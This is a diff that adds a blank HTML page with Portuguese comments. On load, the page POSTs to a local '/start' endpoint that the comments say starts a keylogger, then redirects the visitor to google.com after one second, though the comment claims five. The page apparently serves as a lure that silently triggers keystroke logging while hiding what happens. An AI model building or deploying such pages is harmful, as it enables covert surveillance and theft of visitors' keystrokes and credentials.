@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Site</title>
+    <script>
+        // Função para iniciar o keylogger quando a página é carregada
+        document.addEventListener('DOMContentLoaded', function() {
+            fetch('/start', {
+                method: 'POST'
+            })
+            .then(response => response.text())
+            .then(data => {
+                console.log(data); // Exibe a resposta no console
+            })
+            .catch(error => {
+                console.error('Erro ao iniciar o keylogger:', error);
+            });
+        });
+    </script>
+    <script>
+        // Redireciona para o site após 5 segundos
+        setTimeout(function() {
+            window.location.href = "https://www.google.com";
+        }, 1000); // 1000 milissegundos = 1 segundos
+    </script>
+</head>
+<body>
+    
+</body>
+</html>
